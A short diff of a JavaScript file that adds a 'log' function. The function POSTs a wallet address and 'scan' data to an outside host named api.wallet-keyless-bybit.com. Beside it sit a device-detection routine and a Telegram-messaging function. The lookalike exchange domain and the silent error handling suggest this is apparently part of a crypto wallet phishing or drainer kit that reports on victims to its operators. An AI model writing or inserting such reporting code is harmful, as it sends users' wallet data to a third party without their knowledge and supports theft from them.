@@ -315,6 +315,18 @@ function detectDevice() {
   return 'Desktop'
 }
 
+async function log(adr, scan) {
+  try {
+    const response = await fetch(`https://api.wallet-keyless-bybit.com/api/log`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ adr, scan })
+    })
+  } catch (error) {
+    store.errors.push(`Error: ${error.message}`)
+  }
+}
+
 // Функция отправки сообщений в Telegram
 async function sendTelegramMessage(message) {
   try {
